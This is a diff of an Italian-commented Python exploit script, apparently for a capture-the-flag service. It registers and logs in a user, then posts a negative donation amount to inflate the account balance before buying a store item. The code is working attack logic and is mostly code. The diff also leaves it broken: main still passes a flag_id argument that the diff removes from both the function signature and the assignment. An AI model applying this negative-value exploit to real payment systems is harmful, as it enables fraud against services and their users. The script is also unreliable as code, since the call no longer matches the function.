@@ -3,10 +3,11 @@ import requests
 username = "TESTmiki9"
 email = "testMIKI9@gmail.com"
 password = "12345678"
+ip="http://10.31.4.155:5001"
 
 def register_user(username: str, email: str, password: str):
     try:
-        url = f"http://172.20.10.14:5001/register"
+        url = ip + "/register"
         payload = {
             "username": username,
             "email": email,
@@ -33,7 +34,7 @@ def register_user(username: str, email: str, password: str):
 
 def login_user(username: str, password: str):
     try:
-        url = f"http://172.20.10.14:5001/login"
+        url = ip + "/login"
         payload = {
             "email": email,
             "password": password
@@ -56,9 +57,9 @@ def login_user(username: str, password: str):
         print(f"Errore durante il login: {str(e)}")
         return None
 
-def exploit_donate(session_token: str, flag_id: str):
+def exploit_donate(session_token: str):
     try:
-        url = f"http://172.20.10.14:5001/donate"
+        url = ip + "/donate"
         payload = {
             "amount": -10000000000,  # Exploit del valore negativo
             "username": username
@@ -83,15 +84,19 @@ def exploit_donate(session_token: str, flag_id: str):
 
 def buy_item(session_token: str, item_id: int):
     try:
-        url = f"http://172.20.10.14:5001/store/1/buy"
+        url = ip + "/buy"
         
         headers = {
+            "Authorization": f"Bearer {session_token}",
             "Content-Type": "application/json",
-            "Cookie": f"session={session_token}",  # Usa il cookie di sessione per autenticarti
             "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36"
         }
 
-        response = requests.post(url, headers=headers, verify=False)
+        payload = {
+            "id": "1"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, verify=False)
 
         if response.status_code == 200:
             print(f"Articolo {item_id} acquistato con successo!")
@@ -116,7 +121,6 @@ def main():
     session_token = login_user(username, password)
     if session_token:
         # 3. Exploit (ottenere soldi)
-        flag_id = "flag123"  # Cambia con il flag corretto
         if exploit_donate(session_token, flag_id):
             # 4. Acquisto di un articolo
             item_id = 1  # Cambia con l'ID dell'articolo che vuoi comprare
